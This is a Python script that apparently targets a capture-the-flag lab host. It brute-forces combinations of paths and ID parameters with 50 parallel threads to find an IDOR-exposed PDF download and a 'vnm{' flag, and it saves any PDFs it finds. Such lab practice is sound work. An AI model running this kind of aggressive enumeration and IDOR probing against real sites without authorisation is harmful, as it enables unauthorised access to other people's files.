#!/usr/bin/env python3
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

target = "http://hackme1.vulnmachines.com"

# Generate comprehensive wordlist
base_words = ["idor", "IDOR", "download", "file", "pdf", "document", "get", "fetch", "view", "load"]
extensions = ["", ".php", ".html", ".asp", ".aspx", ".jsp", "/", "/index.php", "/download.php"]
params = ["id", "pdf_id", "file", "filename", "doc", "path", "item", "object"]
values = list(range(0, 20)) + ["admin", "flag", "secret", "test", "1.pdf", "file.pdf", "document.pdf"]

# Generate all possible combinations
all_paths = []

# Direct paths with extensions
for word in base_words:
    for ext in extensions:
        all_paths.append(f"{word}{ext}")

# Parameter combinations
for word in ["download", "file", "get", "view", "pdf"]:
    for ext in [".php", ""]:
        for param in params[:5]:
            for value in values[:10]:
                all_paths.append(f"{word}{ext}?{param}={value}")

# Directory combinations
dirs = ["idor", "IDOR", "challenge", "lab", "mission", "files", "downloads", "pdfs"]
for dir in dirs:
    for file in ["download.php", "file.php", "index.php", "1.pdf", "file.pdf"]:
        all_paths.append(f"{dir}/{file}")
    for param in ["id", "pdf_id", "file"]:
        for value in [1, 2, 3, "flag", "admin"]:
            all_paths.append(f"{dir}/download.php?{param}={value}")

# Remove duplicates
all_paths = list(set(all_paths))

def check_path(path):
    try:
        url = f"{target}/{path}"
        response = requests.get(url, timeout=2, allow_redirects=False)
        
        if response.status_code == 200:
            content = response.content
            
            # Check for PDF
            if content[:4] == b'%PDF':
                return f"[PDF!!!] {url}", content
            
            # Check for non-default content
            if len(content) != 10918 and b'apache2 ubuntu' not in content.lower():
                # Check for interesting keywords
                keywords = [b'idor', b'pdf', b'download', b'file', b'vnm{', b'flag', b'submit', b'form']
                if any(k in content.lower() for k in keywords):
                    return f"[FOUND] {url} - Size: {len(content)}", None
                elif len(content) > 500:
                    return f"[Page] {url} - Size: {len(content)}", None
                    
        elif response.status_code in [301, 302]:
            location = response.headers.get('Location', '')
            if any(k in location.lower() for k in ['pdf', 'idor', 'download', 'file']):
                return f"[Redirect] {url} -> {location}", None
                
    except:
        pass
    return None, None

print(f"[*] Aggressive IDOR/PDF Search")
print(f"[*] Testing {len(all_paths)} unique paths")
print("-" * 60)

found = []
pdfs = []

# Test in batches
batch_size = 100
for i in range(0, len(all_paths), batch_size):
    batch = all_paths[i:i+batch_size]
    print(f"\n[*] Testing batch {i//batch_size + 1}/{(len(all_paths)//batch_size) + 1}...")
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_path, path): path for path in batch}
        
        for future in as_completed(futures):
            result, content = future.result()
            if result:
                print(result)
                if content:  # It's a PDF
                    pdfs.append((result, content))
                else:
                    found.append(result)

print("\n" + "=" * 60)

if pdfs:
    print(f"\n[!!!] FOUND {len(pdfs)} PDF(s)!")
    for i, (desc, content) in enumerate(pdfs, 1):
        filename = f"/workspace/found_{i}.pdf"
        with open(filename, 'wb') as f:
            f.write(content)
        print(f"[+] {desc}")
        print(f"    Saved to: {filename}")
        if b'vnm{' in content.lower():
            print(f"    [!!!] Contains flag!")
            
elif found:
    print(f"\n[+] Found {len(found)} interesting pages:")
    for item in found[:20]:
        print(item)
else:
    print("\n[-] No IDOR challenge or PDFs found")
    print("[!] The challenge is definitely not accessible at this location")